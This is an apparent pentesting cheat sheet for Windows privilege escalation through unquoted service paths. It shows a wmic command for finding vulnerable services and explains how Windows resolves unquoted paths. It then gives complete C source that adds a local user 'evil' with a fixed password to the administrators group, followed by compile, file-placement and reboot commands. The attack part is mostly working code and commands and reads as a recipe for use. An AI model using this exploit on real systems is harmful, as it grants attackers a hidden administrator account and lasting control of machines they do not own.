
> wmic service get displayname,pathname

++ if the paths which showen dont have quotations mark - the service might be vuln ++

********************************************************************************************
For example, imagine that we have a service stored in a path such as C:\Program Files\My
Program\My Service\service.exe. If the service path is stored unquoted, whenever Windows starts
the service it will attempt to run an executable from the following paths:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
*******************************************************************************************

we put our own script and change its name to one of those paths
create c code adduser.c:

#include <stdlib.h>
int main ()
{
int i;
i = system ("net user evil Ev!lpass /add");
i = system ("net localgroup administrators evil /add");
return 0;
}

kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe  

on win machine:
----------------
>move adduser.exe "C:\Program Files\My Program\My.exe"

> shutdown /r /t 0

finnaly: chack if attack worked by try to connect with the new user account
